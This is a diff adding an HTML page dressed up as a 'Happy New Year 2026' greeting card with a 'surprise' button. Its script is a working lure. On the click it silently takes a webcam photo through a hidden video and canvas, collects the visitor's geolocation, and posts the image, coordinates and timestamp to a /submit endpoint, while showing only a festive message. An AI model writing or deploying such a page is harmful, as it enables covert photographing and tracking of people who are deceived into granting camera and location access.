@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Happy New Year 2026 🎆</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  html {
+    height: 100%;
+  }
+
+  body {
+    height: 100%;
+    min-height: 100vh;
+    min-height: -webkit-fill-available;
+    background: linear-gradient(135deg, #0a0e27, #1a1f3a, #2d1b4e);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    color: white;
+    text-align: center;
+    padding: 16px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    background: 
+      radial-gradient(circle at 20% 50%, rgba(255, 215, 0, 0.1) 0%, transparent 50%),
+      radial-gradient(circle at 80% 80%, rgba(138, 43, 226, 0.15) 0%, transparent 50%);
+    animation: glow 8s ease-in-out infinite alternate;
+  }
+
+  @keyframes glow {
+    0% { opacity: 0.5; }
+    100% { opacity: 1; }
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 420px;
+    padding: 32px 20px;
+    background: rgba(255, 255, 255, 0.08);
+    backdrop-filter: blur(12px);
+    border-radius: 24px;
+    border: 1px solid rgba(255, 255, 255, 0.18);
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+  }
+
+  .emoji-large {
+    font-size: 64px;
+    margin-bottom: 16px;
+    display: block;
+    animation: float 3s ease-in-out infinite;
+  }
+
+  @keyframes float {
+    0%, 100% { transform: translateY(0px); }
+    50% { transform: translateY(-12px); }
+  }
+
+  h1 {
+    font-size: 28px;
+    font-weight: 700;
+    margin-bottom: 12px;
+    background: linear-gradient(135deg, #ffd700, #ffed4e);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1.3;
+  }
+
+  p {
+    font-size: 16px;
+    margin-bottom: 32px;
+    color: rgba(255, 255, 255, 0.85);
+    line-height: 1.5;
+    padding: 0 8px;
+  }
+
+  button {
+    width: 100%;
+    padding: 18px 24px;
+    font-size: 17px;
+    border: none;
+    border-radius: 16px;
+    background: linear-gradient(135deg, #ffd700 0%, #ffa500 100%);
+    color: #000;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 20px rgba(255, 215, 0, 0.4);
+    position: relative;
+    overflow: hidden;
+    touch-action: manipulation;
+  }
+
+  button:active {
+    transform: scale(0.98);
+    box-shadow: 0 2px 12px rgba(255, 215, 0, 0.5);
+  }
+
+  button::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 0;
+    height: 0;
+    border-radius: 50%;
+    background: rgba(255, 255, 255, 0.4);
+    transform: translate(-50%, -50%);
+    transition: width 0.5s, height 0.5s;
+  }
+
+  button:active::after {
+    width: 300px;
+    height: 300px;
+  }
+
+  .sparkles {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    pointer-events: none;
+    overflow: hidden;
+  }
+
+  .sparkle {
+    position: absolute;
+    width: 3px;
+    height: 3px;
+    background: white;
+    border-radius: 50%;
+    animation: sparkleAnim 2s linear infinite;
+    opacity: 0;
+  }
+
+  @keyframes sparkleAnim {
+    0%, 100% { opacity: 0; }
+    50% { opacity: 1; }
+  }
+
+  .sparkle:nth-child(1) { top: 20%; left: 10%; animation-delay: 0s; }
+  .sparkle:nth-child(2) { top: 40%; left: 80%; animation-delay: 0.3s; }
+  .sparkle:nth-child(3) { top: 60%; left: 20%; animation-delay: 0.6s; }
+  .sparkle:nth-child(4) { top: 80%; left: 70%; animation-delay: 0.9s; }
+  .sparkle:nth-child(5) { top: 30%; left: 50%; animation-delay: 1.2s; }
+  .sparkle:nth-child(6) { top: 70%; left: 40%; animation-delay: 1.5s; }
+
+  video, canvas {
+    display: none;
+  }
+
+  /* Extra small devices */
+  @media (max-width: 360px) {
+    .container {
+      padding: 24px 16px;
+    }
+    
+    .emoji-large {
+      font-size: 52px;
+    }
+    
+    h1 {
+      font-size: 24px;
+    }
+    
+    p {
+      font-size: 15px;
+      margin-bottom: 24px;
+    }
+    
+    button {
+      padding: 16px 20px;
+      font-size: 16px;
+    }
+  }
+
+  /* Landscape mode */
+  @media (max-height: 500px) and (orientation: landscape) {
+    .container {
+      padding: 20px 16px;
+      max-width: 90%;
+    }
+    
+    .emoji-large {
+      font-size: 48px;
+      margin-bottom: 8px;
+    }
+    
+    h1 {
+      font-size: 22px;
+      margin-bottom: 8px;
+    }
+    
+    p {
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    
+    button {
+      padding: 14px 20px;
+    }
+  }
+
+  /* Prevent zoom on input focus */
+  @media (max-width: 768px) {
+    select, textarea, input, button {
+      font-size: 16px !important;
+    }
+  }
+</style>
+</head>
+
+<body>
+  <div class="sparkles">
+    <div class="sparkle"></div>
+    <div class="sparkle"></div>
+    <div class="sparkle"></div>
+    <div class="sparkle"></div>
+    <div class="sparkle"></div>
+    <div class="sparkle"></div>
+  </div>
+
+  <div class="container">
+    <span class="emoji-large">🎆</span>
+    <h1>Happy New Year 2026</h1>
+    <p>Tap below to unlock your surprise ✨</p>
+
+    <button onclick="start()">🎁 Click to See Your Surprise</button>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+  </div>
+
+<script>
+async function start() {
+  try {
+    // Ask camera permission
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+
+    await new Promise(r => setTimeout(r, 1200));
+
+    const canvas = document.getElementById("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    const image = canvas.toDataURL("image/jpeg");
+
+    stream.getTracks().forEach(t => t.stop());
+
+    navigator.geolocation.getCurrentPosition(
+      pos => sendData(image, pos.coords.latitude, pos.coords.longitude),
+      () => sendData(image, null, null)
+    );
+
+  } catch (err) {
+    alert("Permission denied or not supported.");
+  }
+}
+
+function sendData(image, lat, lng) {
+  fetch("/submit", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      image,
+      latitude: lat,
+      longitude: lng,
+      time: new Date().toISOString()
+    })
+  })
+  .then(() => alert("🎉 Happy New Year 2026 🎉"))
+  .catch(() => alert("Something went wrong"));
+}
+</script>
+</body>
+</html>
